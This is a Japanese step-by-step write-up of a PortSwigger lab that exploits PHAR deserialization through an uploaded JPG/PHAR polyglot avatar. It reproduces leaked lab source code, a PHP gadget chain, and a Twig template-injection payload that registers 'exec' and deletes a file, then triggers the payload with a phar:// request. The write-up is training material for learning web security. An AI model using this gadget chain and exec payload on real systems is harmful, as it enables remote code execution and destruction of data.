# PHAR 逆シリアル化を使用してカスタム ガジェット チェーンをデプロイする

以下のハッキングラボを実施します  
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain  
このラボでは、逆シリアル化を 明示的に使用しません。ただし、PHAR 逆シリアル化を他の高度なハッキング手法と組み合わせた場合でも、カスタム ガジェット チェーンを介してリモート コードを実行できます。

- 1. Burp Suite を起動して、Proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. 一般ユーザーでログインします
- 4. アバター画像をアップロードします
- 5. http history のフィルターで画像のフィルタリングを解除すると、php スクリプトで画像を取得しているようです。

```
GET /cgi-bin/avatar.php?avatar=wiener HTTP/2
Host: 0a7b003f04d129e6807f120400ca0051.web-security-academy.net
Cookie: session=NE3cnPbvlBxQ5botYMxGmSjA34jUtwcd
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Sec-Ch-Ua-Platform: ""
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a7b003f04d129e6807f120400ca0051.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
```

- 6. 上記リクエストで send to repeater します
- 7. GET /cgi-bin に書き換えて送信します
- 8. 上記レスポンスを見ると php ファイルが複数見つかります
  - /cgi-bin/CustomTemplate.php
  - /cgi-bin/CustomTemplate.php~
  - /cgi-bin/Blog.php
  - /cgi-bin/Blog.php~
  - /cgi-bin/avatar.php
- 9. ソース コードを調べて、Blog->desc および CustomTemplate->lockFilePath 属性が関与するガジェット チェーンを特定します

```php
[/cgi-bin/CustomTemplate.php~]
<?php

class CustomTemplate {
    private $template_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
    }

    private function isTemplateLocked() {
        return file_exists($this->lockFilePath());
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lockFilePath(), "") === false) {
                throw new Exception("Could not write to " . $this->lockFilePath());
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        @unlink($this->lockFilePath());
    }

    private function lockFilePath()
    {
        return 'templates/' . $this->template_file_path . '.lock';
    }
}

?>
```

[/cgi-bin/Blog.php~]

```php
<?php

require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php');

class Blog {
    public $user;
    public $desc;
    private $twig;

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }

    public function __toString() {
        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }

    public function __sleep() {
        return ["user", "desc"];
    }
}

?>
```

- 10. Twig テンプレート エンジンのインジェクションコードを検討します

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
```

- 11. CustomTemplate と Blog クラスにインジェクションコードを含めたコードを作成します

```php
class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'user';
$object->template_file_path = $blog;
```

- 12. 以下のコードを使用して、上記コードを含めたポリグロット画像を生成します
      https://github.com/kunte0/phar-jpg-polyglot

- 13. ポリグロット画像をアバター画像としてアップロードします
- 14. repeater のリクエストを GET /cgi-bin/avatar.php?avatar=phar://wiener に書き換えて、ポリグロット画像のスクリプトが実行されるようにすると、一般ユーザーが削除されます
